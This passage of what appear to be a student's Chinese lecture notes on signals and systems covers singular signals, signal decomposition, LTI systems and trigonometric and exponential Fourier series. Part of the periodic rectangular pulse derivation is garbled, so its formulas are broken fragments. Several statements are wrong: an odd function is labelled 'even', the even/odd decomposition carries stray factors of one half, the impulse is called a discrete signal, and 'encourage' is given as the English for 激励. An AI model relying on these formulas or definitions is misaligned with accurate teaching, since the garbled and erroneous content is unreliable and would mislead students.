<p>如果是黑白图像信号，那么积分运算可以削弱图像中的噪声，这也是图像处理中常用的手法。</p>
</blockquote>
<figure>
<img src="/signal-and-system-note1/积分运算.png" alt="积分运算">
<figcaption aria-hidden="true">积分运算</figcaption>
</figure>
<blockquote>
<p>需要注意的是，如果对冲激信号求积分将得到阶跃信号。</p>
</blockquote>
<h4 id="相加与相乘">相加与相乘</h4>
<figure>
<img src="/signal-and-system-note1/相加与相乘.png" alt="相加与相乘">
<figcaption aria-hidden="true">相加与相乘</figcaption>
</figure>
<p>需要说明的是，在通信系统的调制、解调等过程中，将经常遇到两信号相乘运算。</p>
<h3 id="经典奇异信号">经典奇异信号</h3>
<p>奇异信号即函数本身有不连续点（跳变点）或其导数与积分有不连续点的信号。</p>
<h4 id="单位斜变信号">单位斜变信号</h4>
<p>即信号的函数表达式是正比例函数的信号，表达式为 <span class="math display">\[
R(t)=\begin{cases}
t &amp; t\geq0\\
0 &amp; t&lt;0
\end{cases}
\]</span> 若将起始点移位至 <span class="math inline">\(t_0\)</span>
即写为 <span class="math display">\[
R(t-t_0)=\begin{cases}
t-t_0 &amp; t\geq t_0\\
0 &amp; t&lt;t_0
\end{cases}
\]</span></p>
<blockquote>
<p>单位斜变信号记作 <span class="math inline">\(R(t)\)</span>。</p>
</blockquote>
<figure>
<img src="/signal-and-system-note1/斜变信号.png" alt="斜变信号">
<figcaption aria-hidden="true">斜变信号</figcaption>
</figure>
<p>实际应用中会常遇到截平的斜变信号，在时间 <span class="math inline">\(\tau\)</span> 后信号波形被切平，表达式为 <span class="math display">\[
f_1(t)=\begin{cases}
\frac{K}{\tau}t &amp; t &lt; \tau\\
K &amp; t\geq \tau
\end{cases}
\]</span> 通常<strong>三角形脉冲信号</strong>用斜变信号表示： <span class="math display">\[
f_1(t)=\begin{cases}
\frac{K}{\tau}t &amp; t\leq \tau\\
0 &amp; t&gt; \tau
\end{cases}
\]</span> <img src="/signal-and-system-note1/斜变信号变种.png" alt="斜变信号变种"></p>
<h4 id="单位阶跃信号">单位阶跃信号</h4>
<p>单位阶跃信号的表达式为 <span class="math display">\[
u(t)=\begin{cases}
0 &amp; t&lt;0\\
1 &amp; t&gt;0
\end{cases}
\]</span></p>
<blockquote>
<p>一般记单位阶跃信号为 <span class="math inline">\(u(t)\)</span>。</p>
</blockquote>
<p>跳变点 <span class="math inline">\(t=0\)</span>
处无定义，为方便计算一般规定为 <span class="math inline">\(u(0)=\frac{1}{2}\)</span>。</p>
<blockquote>
<p>物理背景是在 <span class="math inline">\(t=0\)</span>
时刻对某一电路接入单位电源（直流电压源或直流电流源），并且无限持续下去。</p>
</blockquote>
<figure>
<img src="/signal-and-system-note1/单位阶跃信号.png" alt="单位阶跃信号">
<figcaption aria-hidden="true">单位阶跃信号</figcaption>
</figure>
<p>如果存在延时，可以表示为 <span class="math display">\[
u(t-t_0)=\begin{cases}
0 &amp; t&lt;t_0\\
1 &amp; t&gt;t_0
\end{cases}
\]</span> <img src="/signal-and-system-note1/延时单位阶跃函数.png" alt="延时单位阶跃函数"></p>
<blockquote>
<p>可以注意到，单位斜变信号的微分就是单位阶跃信号。</p>
</blockquote>
<p>通常用单位阶跃信号来表示<strong>矩形脉冲信号</strong>，即写作 <span class="math display">\[
R_T(t)=u(t)-u(t-T)
\]</span> 表示为宽度为 <span class="math inline">\(T\)</span>，出现在
<span class="math inline">\([0,T]\)</span> 的一个矩形脉冲信号。 <span class="math display">\[
G_T(t)=u(t+\frac{T}{2})-u(t-\frac{T}{2})
\]</span> 表示为带宽为 <span class="math inline">\(T\)</span>，出现在
<span class="math inline">\([-\frac{T}{2},\frac{T}{2}]\)</span>
的一个矩形脉冲信号（也称作窗函数）。</p>
<figure>
<img src="/signal-and-system-note1/矩形脉冲信号.png" alt="矩形脉冲信号">
<figcaption aria-hidden="true">矩形脉冲信号</figcaption>
</figure>
<p>一般我们会用来在数学上抽样其他信号，例如说 <span class="math display">\[
f_1(t)=(\sin{t})u(t)
\]</span> 表示为抽样正弦信号 <span class="math inline">\(\sin{t}\)</span> 中 <span class="math inline">\(t\geq 0\)</span> 的部分。</p>
<p>或者 <span class="math display">\[
f_2(t)=e^{-t}[u(t)-u(t-t_0)]
\]</span> 表示为抽样指数信号 <span class="math inline">\(e^{-t}\)</span>
中 <span class="math inline">\(0\leq t\leq t_0\)</span> 的部分。</p>
<figure>
<img src="/signal-and-system-note1/单位阶跃信号的抽样性.png" alt="单位阶跃信号的抽样性">
<figcaption aria-hidden="true">单位阶跃信号的抽样性</figcaption>
</figure>
<p>符号函数也可以用单位阶跃信号来表示： <span class="math display">\[
\mathrm{sgn}(t)=\begin{cases}
1 &amp; t&gt;0\\
-1 &amp; t&lt;0
\end{cases}
=2u(t)-1
\]</span></p>
<h4 id="单位冲激信号">单位冲激信号</h4>
<p>某些物理现象需要使用一个时间极短但取值极大的函数模型来描述，例如力学中的瞬时冲击力，数字通信中的抽样脉冲等。</p>
<p>单位冲激信号的表达式（用矩形脉冲信号定义）为 <span class="math display">\[
\delta(t)=\lim _{\tau \rightarrow 0}
\frac{1}{\tau}\left[u\left(t+\frac{\tau}{2}\right)-u\left(t-\frac{\tau}{2}\right)\right]
\]</span> 其冲激值（峰值）为 1。</p>
<p>也可以使用其他脉冲定义：</p>
<figure>
<img src="/signal-and-system-note1/单位冲激信号的其他表达式.png" alt="单位冲激信号的其他表达式">
<figcaption aria-hidden="true">单位冲激信号的其他表达式</figcaption>
</figure>
<figure>
<img src="/signal-and-system-note1/冲激函数演变图.png" alt="冲激函数演变图">
<figcaption aria-hidden="true">冲激函数演变图</figcaption>
</figure>
<p>狄拉克给出单位冲激函数的另一种定义： <span class="math display">\[
\begin{cases}
\displaystyle\int^{\infty}_{-\infty}\delta(t)\diff{t}=1 &amp; t=0\\
\delta(t)=0 &amp; t\neq0
\end{cases}
\]</span> 故也称单位冲激函数为<strong>狄拉克函数</strong>。</p>
<p>描述 <span class="math inline">\(t=t_0\)</span>
处的冲激时，可使用如下定义： <span class="math display">\[
\begin{cases}
\displaystyle\int^{\infty}_{-\infty}\delta(t-t_0)\diff{t}=1 &amp;
t=t_0\\
\delta(t-t_0)=0 &amp; t\neq t_0
\end{cases}
\]</span> <img src="/signal-and-system-note1/t0时刻出现的冲激函数.png" alt="t0时刻出现的冲激函数"></p>
<blockquote>
<p>可以发现单位冲激信号实际上为离散信号。</p>
</blockquote>
<p>单位冲激信号有以下性质： <span class="math display">\[
\int^{\infty}_{-\infty}\delta(t)f(t)\diff{t}=\int^{\infty}_{-\infty}\delta(t)f(0)\diff{t}=f(0)\int^{\infty}_{-\infty}\delta(t)\diff{t}=f(0)
\]</span> 即采样结果为冲激处的函数值。</p>
<p>类似地，对于延迟的单位冲激信号有 <span class="math display">\[
\int^{\infty}_{-\infty}\delta(t-t_0)f(t)\diff{t}=\int^{\infty}_{-\infty}\delta(t-t_0)f(t_0)\diff{t}=f(t_0)
\]</span>
故单位冲激信号具有<strong>采样特性</strong>（或称筛选特性）。</p>
<p>单位冲激信号是<strong>偶函数</strong>。（不给予证明）</p>
<p>单位冲激信号的积分是单位阶跃信号： <span class="math display">\[
u(t)=\int^t_{-\infty}\delta(\tau)\diff(\tau)
\]</span> 同理，单位阶跃信号的微分是单位冲激信号： <span class="math display">\[
\frac{\diff}{\diff{t}}u(t)=\delta(t)
\]</span></p>
<blockquote>
<p>由积分性质可以知道，如果给予一个冲激电流信号，那么就可以使得电容两端电压发生跳变；</p>
<p>由微分性质可以知道，如果给予一个冲激电压信号，那么就可以使得电感两端电流发生跳变。</p>
</blockquote>
<h4 id="冲激偶信号">冲激偶信号</h4>
<p>冲激信号的微分（阶跃信号的二阶导数）将会呈现正、负两种极性的一对冲激，称为冲激偶信号，表示为
<span class="math inline">\(\delta&#39;(t)\)</span>。</p>
<figure>
<img src="/signal-and-system-note1/冲激偶的形成.png" alt="冲激偶的形成">
<figcaption aria-hidden="true">冲激偶的形成</figcaption>
</figure>
<p>冲激偶的一个重要性质为 <span class="math display">\[
\int^{\infty}_{-\infty}\delta&#39;(t)f(t)\diff{t}=-f&#39;(0)
\]</span> 或者是 <span class="math display">\[
\int^{\infty}_{-\infty}\delta&#39;(t-t_0)f(t)\diff{t}=-f&#39;(t_0)
\]</span> 另一个性质是 <span class="math display">\[
\int^{\infty}_{-\infty}\delta&#39;(t)\diff{t}=0
\]</span></p>
<h4 id="总结">总结</h4>
<p>可以发现从<strong>单位斜变信号</strong>到<strong>单位阶跃信号</strong>到<strong>单位冲激信号</strong>再到<strong>冲激偶信号</strong>是一步一步微分的结果，反之也是一步一步积分的结果，其中单位冲激信号也是之后方便<strong>采样</strong>信号的最重要的函数。</p>
<h3 id="信号的分解">信号的分解</h3>
<p>为方便研究信号传输和信号处理的问题，往往将一些信号分解为比较简单的或比较基本的<strong>信号分量</strong>之和。</p>
<h4 id="直流分量与交流分量">直流分量与交流分量</h4>
<p><strong>信号平均值即为信号的直流分量；交流分量即为原信号去掉直流分量。</strong></p>
<p>表达式为 <span class="math display">\[
f(t)=f_D+f_A(t)
\]</span></p>
<blockquote>
<p>Direct-current 是直流的英文；Alternating-current 是交流的英文。</p>
</blockquote>
<p>其中 <span class="math inline">\(f_D\)</span> 为直流分量，<span class="math inline">\(f_A(t)\)</span> 为交流分量。</p>
<p>需要知道 <span class="math inline">\(f_Df_A(t)\)</span>
在对称区间上的积分为 0。</p>
<h4 id="偶分量与奇分量">偶分量与奇分量</h4>
<p>偶分量定义为 <span class="math display">\[
f_e(t)=f_e(-t)
\]</span> 奇分量定义为 <span class="math display">\[
f_o(t)=-f_o(-t)
\]</span></p>
<blockquote>
<p>even 是偶数的英文；odd 是 奇数的英文。</p>
</blockquote>
<p>由于任何信号都可以写成 <span class="math display">\[
\begin{align}
f(t)&amp;=\frac{1}{2}[f(t)+f(t)+f(-t)-f(-t)]\\
&amp;=\frac{1}{2}[f(t)+f(-t)]+\frac{1}{2}[f(t)-f(-t)]\\
&amp;=\frac{1}{2}f_e(t)+\frac{1}{2}f_o(t)
\end{align}
\]</span> 即 <span class="math display">\[
f_e(t)=\frac{1}{2}[f(t)+f(-t)]\\
f_o(t)=\frac{1}{2}[f(t)-f(-t)]
\]</span> <img src="/signal-and-system-note1/信号的偶分量和奇分量.png" alt="信号的偶分量和奇分量"></p>
<h4 id="脉冲分量">脉冲分量</h4>
<p><strong>一个信号可近似分解为许多脉冲分量之和。</strong></p>
<p>主要的方式是将信号分解为<strong>冲激信号的叠加</strong>。</p>
<p>即写作 <span class="math display">\[
f(t_0)=\int^{\infty}_{-\infty}f(t)\delta(t-t_0)\diff{t}
\]</span></p>
<h4 id="实部分量与虚部分量">实部分量与虚部分量</h4>
<p>主要是复分析中常采用的方式，采用共轭分解的方法。</p>
<p>已知 <span class="math display">\[
f(t)=f_r(t)+\j f_i(t)
\]</span> 那么它的共轭复函数写作 <span class="math display">\[
f^*(t)=f_r(t)-\j f_i(t)
\]</span></p>
<blockquote>
<p>real 是实数的英文；image 是虚数的英文。</p>
</blockquote>
<p>那么 <span class="math display">\[
f_r(t)=\frac{1}{2}[f(t)+f^*(t)]\\
f_i(t)=\frac{1}{2\j}[f(t)-f^*(t)]
\]</span> 且 <span class="math display">\[
|f(t)|^2=f(t)f^*(t)=f_r^2(t)+f_i^2(t)
\]</span>
虽然现实中的信号都是实信号，但复分析可以很好的帮助我们简化信号的分析。</p>
<h4 id="正交函数分量">正交函数分量</h4>
<p>用正交函数集来表示一个信号，那么信号分量也是相互正交的。</p>
<p>例如常常用正弦信号与余弦信号的叠加来表示一个矩形脉冲。</p>
<p>主要采用的数学工具是<strong>傅里叶级数</strong>和<strong>傅里叶展开</strong>。</p>
<h3 id="系统模型">系统模型</h3>
<h4 id="时域运算的基本元件">时域运算的基本元件</h4>
<h5 id="加法器">加法器</h5>
<p><img src="/signal-and-system-note1/加法器.png" alt="加法器"> <span class="math display">\[
r(t)=e_1(t)+e_2(t)
\]</span></p>
<blockquote>
<p>encourage 是激励的英文；response 是响应的英文。</p>
</blockquote>
<h5 id="倍乘器">倍乘器</h5>
<p><img src="/signal-and-system-note1/倍乘器.png" alt="倍乘器"> <span class="math display">\[
r(t)=Ae(t)
\]</span></p>
<h5 id="微分器">微分器</h5>
<p><img src="/signal-and-system-note1/微分器.png" alt="微分器"> <span class="math display">\[
r(t)=\frac{\diff}{\diff{t}}e(t)
\]</span></p>
<h5 id="积分器">积分器</h5>
<p><img src="/signal-and-system-note1/积分器.png" alt="积分器"> <span class="math display">\[
r(t)=\int e(t)
\]</span></p>
<h4 id="线性时不变系统">线性时不变系统</h4>
<p>线性时不变系统即 Linear Time - Invariant，缩写为 LTI，简称 LTI
系统。</p>
<p>线性时不变系统具有以下一些基本特性。</p>
<h5 id="叠加性与均匀性">叠加性与均匀性</h5>
<figure>
<img src="/signal-and-system-note1/线性系统的叠加性与均匀性.png" alt="线性系统的叠加性与均匀性">
<figcaption aria-hidden="true">线性系统的叠加性与均匀性</figcaption>
</figure>
<p><strong>满足叠加定理</strong>，即 <span class="math display">\[
C_1e_1(t)+C_2e_2(t)=C_1r_1(t)+C_2r_2(t)
\]</span></p>
<h5 id="时不变特性">时不变特性</h5>
<p><strong>系统响应与激励施加于系统的时刻无关。</strong></p>
<p>即如果激励为 <span class="math inline">\(e(t-t_0)\)</span>，那么响应也会相应的变为 <span class="math inline">\(r(t-t_0)\)</span>。</p>
<h5 id="微分特性">微分特性</h5>
<p>即激励为 <span class="math inline">\(\frac{\diff{e(t)}}{\diff{t}}\)</span>，那么响应也会相应的变为
<span class="math inline">\(\frac{\diff{r(t)}}{\diff{t}}\)</span>。</p>
<blockquote>
<p>以上三个特性可以总结为，激励信号的运算也会相应作用于响应信号。</p>
</blockquote>
<h5 id="因果性">因果性</h5>
<p><strong>响应只与激励发生的时刻及时刻之前有关，便称为因果系统。</strong></p>
<p>或者说，激励是产生响应的原因，响应式激励引起的结果，这种特性称为因果性。</p>
<p>例如系统模型为 <span class="math display">\[
r_1(t)=e_1(t-1)
\]</span>
可以发现<strong>响应信号是滞后于激励信号的</strong>，故该系统是<strong>因果系统</strong>。</p>
<p>如果 <span class="math display">\[
r_2(t)=e_2(t+1)
\]</span>
可以发现<strong>响应信号是超前于激励信号的</strong>，故该系统是<strong>非因果系统</strong>。</p>
<p><strong>实际的物理可实现系统均为因果系统。</strong></p>
<p>而在 <span class="math inline">\(t=0\)</span>
时刻接入的系统信号称为<strong>因果信号</strong>。</p>
<h4 id="系统数学模型微分方程的建立">系统数学模型（微分方程）的建立</h4>
<figure>
<img src="/signal-and-system-note1/RLC并联电路.png" alt="RLC并联电路">
<figcaption aria-hidden="true">RLC并联电路</figcaption>
</figure>
<p>设各支路电流分别为 <span class="math inline">\(i_R(t),i_L(t),i_C(t)\)</span>，以 <span class="math inline">\(v(t)\)</span>
作为待求响应函数，根据元件本身的特性，可得 <span class="math display">\[
i_R(t)=\frac{1}{R}v(t)\\
i_L(t)=\frac{1}{L}\int^t_{-\infty}v(\tau)\diff{\tau}\\
i_C(t)=C\frac{\diff}{\diff{t}}v(t)
\]</span> 根据基尔霍夫定律有 <span class="math display">\[
i_R(t)+i_L(t)+i_C(t)=i_S(t)
\]</span> 解得 <span class="math display">\[
C\frac{\diff^2}{\diff{t^2}}v(t)+\frac{1}{R}\frac{\diff}{\diff{t}}v(t)+\frac{1}{L}v(t)=\frac{\diff}{\diff{t}}i_S(t)
\]</span> 为一个二阶常系数微分方程。</p>
<figure>
<img src="/signal-and-system-note1/机械位移系统.png" alt="机械位移系统">
<figcaption aria-hidden="true">机械位移系统</figcaption>
</figure>
<p>设位移速度 <span class="math inline">\(v(t)=\frac{\diff}{\diff{t}}y(t)\)</span>，弹簧手力
<span class="math inline">\(F_k(t)\)</span>，由胡克定律可得 <span class="math display">\[
F_k(t)=ky(t)=k\int^t_{-\infty}v(\tau)\diff{\tau}
\]</span> 阻尼力 <span class="math display">\[
F_f(t)=fv(t)
\]</span> 惯性力 <span class="math display">\[
F_m(t)=m\frac{\diff}{\diff{t}}v(t)
\]</span> 根据达朗贝尔原理，系统受力应该保持平衡，有 <span class="math display">\[
m\frac{\diff}{\diff{t}}v(t)+fv(t)+k\int^t_{-\infty}v(\tau)\diff{\tau}=F_s(t)
\]</span> 两端微分得到 <span class="math display">\[
m\frac{\diff^2}{\diff{t^2}}v(t)+f\frac{\diff}{\diff{t}}v(t)+kv(t)=\frac{\diff}{\diff{t}}F_s(t)
\]</span> 为一个二阶常系数微分方程。</p>
<p>从上式可以看出，这两个系统所建立的数学模型是相似的，即使他们是性质完全不同的两个物理系统。</p>
<p>这是<strong>系统之间的相似性</strong>，对于完全没有接触过的系统，我们也可以通过系统的相似性来分析它。</p>
]]></content>
      <tags>
        <tag>信号与系统</tag>
      </tags>
  </entry>
  <entry>
    <title>信号与系统笔记</title>
    <url>//signal-and-system-note3.html</url>
    <content><![CDATA[<h1 id="信号与系统">信号与系统</h1>
<h2 id="傅里叶级数">傅里叶级数</h2>
<h3 id="三角形式的傅里叶级数">三角形式的傅里叶级数</h3>
<p>首先我们知道，<strong>周期函数</strong> <span class="math inline">\(f(t)\)</span> 可用傅里叶级数表示，形式如下 <span class="math display">\[
f(t)=a_0+\sum^\infty_{n=1}[a_n\cos{(n\omega t)}+b_n\sin{(n\omega t)}]
\]</span> 直流分量 <span class="math inline">\(a_0\)</span> <span class="math display">\[
\newcommand{\diff}{\mathrm{d}}
a_0=\frac{1}{T}\int^{t_0+T}_{t_0}f(t)\diff{t}
\]</span> 余弦分量的幅值 <span class="math display">\[
a_n=\frac{2}{T}\int^{t_0+T}_{t_0}f(t)\cos{(n\omega  t)}\diff{t}
\]</span> 正弦分量的幅值 <span class="math display">\[
b_n=\frac{2}{T}\int^{t_0+T}_{t_0}f(t)\sin{(n\omega  t)}\diff{t}
\]</span> 其中 <span class="math inline">\(T\)</span> 为周期函数 <span class="math inline">\(f(t)\)</span> 的<strong>周期</strong>。</p>
<p>如果用和差化积公式将两项三角函数合并为一项，则可表示为 <span class="math display">\[
f(t)=c_0+\sum^\infty_{n=1}c_n\cos{(n\omega t+\varphi_n)}
\]</span> 或 <span class="math display">\[
f(t)=d_0+\sum^\infty_{n=1}d_n\sin{(n\omega t+\theta_n)}
\]</span> 其中满足 <span class="math display">\[
a_0=c_0=d_0\\
c_n=d_n=\sqrt{a_n^2+b_n^2}\\
a_n=c_n\cos{\varphi_n}=d_n\sin{\theta_n}\\
b_n=-c_n\sin{\varphi_n}=d_n\cos{\theta_n}\\
\tan{\theta_n}=\frac{a_n}{b_n}\\
\tan{\varphi_n}=-\frac{b_n}{a_n}
\]</span> 正弦、余弦分量的频率必定是<strong>基频</strong> <span class="math inline">\(f_1=1/T\)</span> 的整数倍，通常把频率为 <span class="math inline">\(f_1\)</span>
的分量称为<strong>基波</strong>，频率为 <span class="math inline">\(2f_1,3f_1,\cdots\)</span>
的称为<strong>二次谐波</strong>、<strong>三次谐波</strong>等。</p>
<p>从上式可以发现，<span class="math inline">\(a_n,b_n,c_n\)</span>
是关于 <span class="math inline">\(n\omega\)</span> 的函数，记 <span class="math inline">\(a_n=a_n(n\omega)\)</span>，对于不同的 <span class="math inline">\(n\omega\)</span> 值有不同的取值，绘制 <span class="math inline">\(c_n-n\omega\)</span> 图可得</p>
<figure>
<img src="/signal-and-system-note3/周期信号的频谱图示例.png" alt="周期信号的频谱图示例">
<figcaption aria-hidden="true">周期信号的频谱图示例</figcaption>
</figure>
<p>明显可以看出<strong>各频率分量的相对大小</strong>，我们把这种图称为信号的<strong>幅度频谱</strong>或简称<strong>幅度谱</strong>，图中的实线称作<strong>谱线</strong>，虚线称作<strong>包络线</strong>——反映各分量的幅度变化情况。</p>
<p>同理还可以绘制<strong>相位频谱</strong>或简称<strong>相位谱</strong>。</p>
<h3 id="指数形式的傅里叶级数">指数形式的傅里叶级数</h3>
<p>根据欧拉公式可转换为 <span class="math display">\[
\newcommand{\j}{\mathrm{j}}
f(t)=a_0+\sum^\infty_{n=1}\left(\frac{a_n-\j b_n}{2}e^{\j n\omega
t}+\frac{a_n+\j b_n}{2}e^{-\j n\omega t} \right)
\]</span> 不妨令 <span class="math display">\[
F(n\omega)=\frac{1}{2}(a_n-\j b_n)
\]</span></p>
<blockquote>
<p>从公式知晓：</p>
<p><span class="math inline">\(a_n\)</span> 是关于 <span class="math inline">\(n\)</span> 的偶函数，故 <span class="math inline">\(a_n(-n\omega)=a_n(n\omega)\)</span>；</p>
<p><span class="math inline">\(b_n\)</span> 是关于 <span class="math inline">\(n\)</span> 的奇函数，故 <span class="math inline">\(b_n(-n\omega)=-b_n(n\omega)\)</span>；</p>
<p><span class="math inline">\(F(0)=a_0\)</span>。</p>
</blockquote>
<p>故 <span class="math display">\[
\newcommand{\j}{\mathrm{j}}
f(t)=\sum^{\infty}_{-\infty}F(n\omega)e^{\j n\omega t}\\
\]</span> 一般也会简写 <span class="math inline">\(F_n\)</span> <span class="math display">\[
F_n=\frac{1}{T}\int^{t_0+T}_{t_0}f(t)e^{-\j n\omega t}\diff{t}
\]</span> 其中满足 <span class="math display">\[
F_0=c_0=d_0=a_0\\
F_n=|F_n|e^{\j \varphi_n}\\
F_{-n}=|F_{-n}|e^{-\j \varphi_n}\\
|F_n|=|F_{-n}|=\frac{1}{2}c_n=\frac{1}{2}d_n=\frac{1}{2}\sqrt{a_n^2+b_n^2}\\
|F_n|+|F_{-n}|=c_n\\
F_n+F_{-n}=a_n\\
b_n=\j(F_n-F_{-n})\\
c_n^2=d_n^2=a_n^2+b_n^2=4F_nF_{-n}
\]</span>
同样我们可以画出指数形式下的<strong>幅度谱</strong>，又称<strong>复数频谱</strong>。其中
<span class="math inline">\(F_n\)</span> 的大小由 <span class="math inline">\(|F_n|\)</span> 决定，正负由相位 <span class="math inline">\(\varphi_n\)</span> 决定，合在一张频谱图上得到</p>
<figure>
<img src="/signal-and-system-note3/周期信号的复数频谱.png" alt="周期信号的复数频谱">
<figcaption aria-hidden="true">周期信号的复数频谱</figcaption>
</figure>
<h3 id="周期信号的平均功率">周期信号的平均功率</h3>
<p><span class="math display">\[
P=\overline{f^2(t)}=\sum^{\infty}_{-\infty}|F_n|^2
\]</span></p>
<p>即<strong>周期信号的平均功率等于傅里叶级数展开各谐波分量有效值的平方和</strong>，也即<strong>时域和频域能量守恒</strong>。</p>
<h3 id="函数的对称性与傅里叶系数的关系">函数的对称性与傅里叶系数的关系</h3>
<h4 id="偶函数">偶函数</h4>
<p>由于偶函数满足 <span class="math display">\[
f(t)=f(-t)
\]</span> 故傅里叶展开后只可能是偶级数，所以 <span class="math display">\[
\begin{cases}
a_n=\frac{4}{T}\int^{\frac{T}{2}}_{0}f(t)\cos{(n\omega  t)}\diff{t}\\
b_n=0
\end{cases}
\]</span> 可以得到 <span class="math display">\[
c_n=d_n=a_n=2F_n\\
F_n=F_{-n}=\frac{a_n}{2}\\
\varphi_n=0\\
\theta_n=\frac{\pi}{2}
\]</span> 且偶函数的 <span class="math inline">\(F_n\)</span>
为实数。</p>
<h4 id="奇函数">奇函数</h4>
<p>由于偶函数满足 <span class="math display">\[
-f(t)=f(-t)
\]</span> 故傅里叶展开后只可能是奇级数，所以 <span class="math display">\[
\begin{cases}
a_0=0,a_n=0\\
b_n=\frac{4}{T}\int^{\frac{T}{2}}_{0}f(t)\sin{(n\omega  t)}\diff{t}
\end{cases}
\]</span> 可以得到 <span class="math display">\[
c_n=d_n=a_n=2\j F_n\\
F_n=-F_{-n}=-\j\frac{a_n}{2}\\
\varphi_n=-\frac{\pi}{2}\\
\theta_n=0
\]</span> 且偶函数的 <span class="math inline">\(F_n\)</span>
为虚数。</p>
<h4 id="奇谐函数">奇谐函数</h4>
<p>该函数满足 <span class="math display">\[
f(t)=-f(t\pm \frac{T}{2})
\]</span> 即每个周期发生一次翻转的函数。</p>
<figure>
<img src="/signal-and-system-note3/可能的奇谐函数.png" alt="可能的奇谐函数">
<figcaption aria-hidden="true">可能的奇谐函数</figcaption>
</figure>
<p>当 <span class="math inline">\(n\)</span> 为偶数时， <span class="math display">\[
\begin{cases}
a_0=0,a_n=0\\
b_n=0
\end{cases}
\]</span> 当 <span class="math inline">\(n\)</span> 为奇数时， <span class="math display">\[
\begin{cases}
a_n=\frac{4}{T}\int^{\frac{T}{2}}_{0}f(t)\cos{(n\omega  t)}\diff{t}\\
b_n=\frac{4}{T}\int^{\frac{T}{2}}_{0}f(t)\sin{(n\omega  t)}\diff{t}
\end{cases}
\]</span>
可见，<strong>半波对称周期函数</strong>的傅里叶级数中，只含有<strong>基波</strong>和<strong>奇次谐波</strong>的正弦项和余弦项，故称为<strong>奇谐函数</strong>。</p>
<h3 id="典型周期信号的傅里叶级数">典型周期信号的傅里叶级数</h3>
<h4 id="周期矩形脉冲信号">周期矩形脉冲信号</h4>
<p>设周期矩形脉冲信号 <span class="math inline">\(f(t)\)</span>
的脉冲宽度为 <span class="math inline">\(\tau\)</span>，脉冲幅度为 <span class="math inline">\(E\)</span>，重复周期为 <span class="math inline">\(T\)</span>，有 <span class="math display">\[
f(t)=E\left[u(t+\frac{\tau}{2}-u(t-\frac{\tau}{2}) \right]
\]</span> <img src="/signal-and-system-note3/周期矩形脉冲信号图示.png" alt="周期矩形脉冲信号图示"></p>
<p><strong>傅里叶展开</strong> $$ <span class="math display">\[\begin{align}
a_0&amp;=\frac{E\tau}{T}\\

a_n&amp;=\frac{2E}{n\pi}\sin{(\frac{\tau}{T} n\pi)}\\
&amp;=\frac{2E\tau}{T}\mathop{\mathrm{Sa}}{(\frac{\tau}{T} n\pi)}\\
b_n&amp;=0
\end{align}\]</span> <span class="math display">\[
故**傅里叶级数**为
\]</span> f(t)=+<sup>{}<em>{n=1} <span class="math display">\[
**指数形式的傅里叶展开**
\]</span> F_n= <span class="math display">\[
故**傅里叶级数**为
\]</span> f(t)=^{}</em>{-}e</sup>{nt} $$
可以得到<strong>频谱图</strong></p>
<figure>
<img src="/signal-and-system-note3/周期矩形脉冲信号的频谱图.png" alt="周期矩形脉冲信号的频谱图">
<figcaption aria-hidden="true">周期矩形脉冲信号的频谱图</figcaption>
</figure>
<p>记矩形信号的<strong>频带宽度</strong> <span class="math inline">\(B_\omega=\frac{2\pi}{\tau}\)</span>，或 <span class="math inline">\(B_f=\frac{1}{\tau}\)</span>。</p>
<p>例如周期对称方波信号的傅里叶级数求解</p>
<figure>
<img src="/signal-and-system-note3/周期对称方波信号.png" alt="周期对称方波信号">
<figcaption aria-hidden="true">周期对称方波信号</figcaption>
</figure>
<p>其中，幅度为 <span class="math inline">\(E\)</span>，脉冲宽度为 <span class="math inline">\(\tau=\frac{T}{2}\)</span>。</p>
<p>由于它为<strong>奇谐函数</strong>，又为<strong>偶函数</strong>，故
<span class="math display">\[
a_0,b_n=0\\
a_n=E\mathop{\mathrm{Sa}}{(\frac{n\pi}{2})}=\pm
\frac{2E}{n\pi},n=1,3,5,\cdots
\]</span></p>
<blockquote>
<p><span class="math inline">\(\frac{2E\tau}{T}=E\)</span>；<span class="math inline">\(\mathop{\mathrm{Sa}}{(\frac{n\pi}{2})}=\pm
1,n=1,3,5,\cdots\)</span>；<span class="math inline">\(F_n=F_{-n}=\frac{E}{2}\mathop{\mathrm{Sa}}{(\frac{n\pi}{2})}\)</span>。</p>
</blockquote>
<p>故傅里叶级数为 <span class="math display">\[
\begin{align}
f(t)&amp;=\frac{2E}{\pi}\sum^{\infty}_{n=1}\frac{\sin{\frac{n\pi}{2}}}{n}\cos{(n\omega
t)}\\
&amp;=\frac{E}{\pi}\sum^{\infty}_{n=1}\frac{\sin{\frac{n\pi}{2}}}{n}e^{\j
n\omega t},n=1,3,5,\cdots
\end{align}
\]</span></p>
<h4 id="周期锯齿脉冲信号">周期锯齿脉冲信号</h4>
<figure>
<img src="/signal-and-system-note3/周期锯齿脉冲信号的波形.png" alt="周期锯齿脉冲信号的波形">
<figcaption aria-hidden="true">周期锯齿脉冲信号的波形</figcaption>
</figure>
<p>傅里叶级数为 <span class="math display">\[
f(t)=\frac{E}{\pi}\sum^{\infty}_{n=1}(-1)^{n+1}\frac{1}{n}\sin{(n \omega
t)}
\]</span></p>
<h4 id="周期三角脉冲信号">周期三角脉冲信号</h4>
<figure>
<img src="/signal-and-system-note3/周期三角脉冲信号波形.png" alt="周期三角脉冲信号波形">
<figcaption aria-hidden="true">周期三角脉冲信号波形</figcaption>
</figure>
<p>傅里叶级数为 <span class="math display">\[
f(t)=\frac{E}{2}+\frac{4E}{\pi^2}\sum^{\infty}_{n=1}\frac{1}{n^2}\sin^2{(\frac{n\pi}{2})}\cos{(n
\omega t)}
\]</span></p>
<blockquote>
<p>当 <span class="math inline">\(n\)</span> 为奇数时，<span class="math inline">\(\sin^2{(\frac{n\pi}{2})}=1\)</span>；</p>
<p>当 <span class="math inline">\(n\)</span> 为偶数时，<span class="math inline">\(\sin^2{(\frac{n\pi}{2})}=0\)</span>。</p>
</blockquote>
<h4 id="周期半波余弦信号">周期半波余弦信号</h4>
<p><span class="math display">\[
f(t)=\frac{E}{\pi}-\frac{2E}{\pi}\sum^{\infty}_{n=1}\frac{1}{n^2-1}\cos{(\frac{n\pi}{2})}\cos{(n
\omega t)}
\]</span></p>
<h4 id="周期全波余弦信号">周期全波余弦信号</h4>
<p>即信号 <span class="math inline">\(f(t)=E|\cos{(\omega_0
t)}|\)</span>，则 <span class="math display">\[
f(t)=\frac{2E}{\pi}+\frac{4E}{\pi^2}\sum^{\infty}_{n=1}(-1)^{n+1}\frac{1}{4n^2-1}\cos{(2n
\omega_0 t)}
\]</span></p>
<h2 id="傅里叶变换">傅里叶变换</h2>
<h3 id="原理">原理</h3>
